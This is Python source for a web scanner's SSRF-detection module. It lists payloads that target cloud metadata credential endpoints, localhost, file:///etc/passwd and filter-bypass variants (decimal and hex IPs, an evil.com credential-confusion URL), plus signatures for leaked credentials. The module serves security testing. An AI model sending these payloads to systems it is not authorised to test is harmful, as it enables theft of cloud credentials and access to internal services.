"""
SSRFModule — Server-Side Request Forgery detection.

Tests SSRF-prone parameters against cloud metadata and internal targets,
with a set of filter-bypass variants (encoding, IPv6, decimal IP, redirect
style). Optionally augments payloads and response judgement with AI.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from modules import BaseModule


# Signatures that strongly indicate the server fetched an internal/metadata URL.
METADATA_SIGNATURES = [
    "ami-id", "instance-id", "iam/security-credentials", "accountid",
    "computeMetadata", "kube-env", "root:x:0:", "oauth2/token",
    "access_token", "ssh-rsa", "metadata.google", "securityCredentials",
]

# Core SSRF targets plus common filter-bypass variants.
SSRF_PAYLOADS = [
    # AWS / GCP / Azure metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    # Localhost variants / internal
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "file:///etc/passwd",
    # Bypass variants
    "http://2130706433/",                 # decimal IP for 127.0.0.1
    "http://0x7f000001/",                 # hex IP
    "http://127.0.0.1.nip.io/",           # DNS that resolves to localhost
    "http://169.254.169.254\\@evil.com/",  # credential confusion
]

SSRF_PARAMS = ["url", "redirect", "next", "return", "callback", "fetch",
               "load", "link", "src", "uri", "path", "target", "dest",
               "destination", "image", "img", "proxy", "feed", "host", "site"]


class SSRFModule(BaseModule):
    NAME = "SSRF"

    def run(self):
        self.ui.section("SSRF — Server-Side Request Forgery Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()

        # Build the list of (url, param) injection points: the base URL plus
        # every discovered endpoint that already carries an SSRF-prone param.
        targets = self._collect_targets()
        self.ui.info(f"Testing {len(targets)} SSRF injection point(s)")

        for base, param in targets:
            payloads = list(SSRF_PAYLOADS)
            if self.ai and self.ai.enabled:
                try:
                    extra = self.ai.suggest_ssrf_payloads(param, base)
                    if extra:
                        payloads = list(dict.fromkeys(extra + payloads))
                except Exception:
                    pass

            for payload in payloads[:8]:
                url = f"{base}?{param}={urllib.parse.quote(payload, safe='')}"
                try:
                    resp = s.get(url, timeout=self.timeout)
                except Exception:
                    continue

                hit = any(sig in resp.text for sig in METADATA_SIGNATURES)

                # AI second opinion (optional) when no clear signature matched.
                ai_reason = None
                if not hit and self.ai and self.ai.enabled:
                    try:
                        verdict = self.ai.analyze_ssrf_response(url, payload, resp.text)
                        if verdict and verdict.get("is_ssrf") and \
                                verdict.get("confidence") in ("high", "medium"):
                            hit = True
                            ai_reason = verdict.get("reason")
                    except Exception:
                        pass

                if hit:
                    desc = (
                        f"The '{param}' parameter makes the server fetch arbitrary URLs. "
                        f"Payload {payload} returned data matching an internal/metadata "
                        "signature. An attacker can reach internal services and, on cloud "
                        "hosts, steal IAM credentials to take over the account."
                    )
                    if ai_reason:
                        desc += f"\n\nAI assessment: {ai_reason}"
                    self.db.add(
                        title=f"SSRF via '{param}' Parameter",
                        severity="critical", url=base, module=self.NAME,
                        description=desc,
                        remediation=(
                            "Whitelist allowed URL schemes and destinations. Block access to "
                            "RFC1918 and cloud metadata IP ranges at the network level. "
                            "Disable URL fetch functionality if not needed."
                        ),
                        cvss="9.1", confidence="high",
                        evidence=[f"Payload: {payload}", f"PoC: {url}"],
                    )
                    self.ui.find("critical", f"SSRF via '{param}'", base)
                    break  # one confirmed payload per param is enough
                time.sleep(self.delay)

    def _collect_targets(self):
        targets = []
        seen = set()

        # Base URL probed against every candidate param.
        for param in SSRF_PARAMS:
            key = (self.base_url, param)
            if key not in seen:
                seen.add(key)
                targets.append(key)

        # Discovered endpoints that already use an SSRF-prone param.
        for ep in self.ctx.get("endpoints", []):
            try:
                parsed = urllib.parse.urlparse(ep)
                base = parsed.scheme + "://" + parsed.netloc + parsed.path
                for param in urllib.parse.parse_qs(parsed.query):
                    if param.lower() in SSRF_PARAMS:
                        key = (base, param)
                        if key not in seen:
                            seen.add(key)
                            targets.append(key)
            except Exception:
                continue

        return targets


# --- Secrets Module ---------------------------------------------------------
